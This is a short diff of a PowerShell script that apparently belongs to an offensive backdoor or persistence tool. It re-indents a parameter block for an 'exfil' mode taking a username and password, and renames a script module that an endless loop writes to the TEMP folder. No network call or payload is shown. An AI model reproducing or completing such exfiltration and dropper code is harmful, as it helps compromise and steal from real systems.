@@ -1,12 +1,12 @@
-    [CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
-        [Parameter(Position = 0, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $username = "null",
+[CmdletBinding(DefaultParameterSetName="noexfil")] Param( 
+    [Parameter(Position = 0, Mandatory = $False, Parametersetname="exfil")]
+    [String]
+    $username = "null",
 
-        [Parameter(Position = 1, Mandatory = $False, Parametersetname="exfil")]
-        [String]
-        $password = "null"
-    )
+    [Parameter(Position = 1, Mandatory = $False, Parametersetname="exfil")]
+    [String]
+    $password = "null"
+)
     
 $functions =  {
 
@@ -358,7 +358,7 @@ $functions =  {
         
         while($true)
         {
-            $modulename = "34F3E433-9DE0-4930-AF3F-D099EF30490B.ps1"
+            $modulename = "a.ps1"
             $modulenamepath = "$env:TEMP\$modulename"
             
             if(-Not ([System.IO.File]::Exists($modulenamepath)))
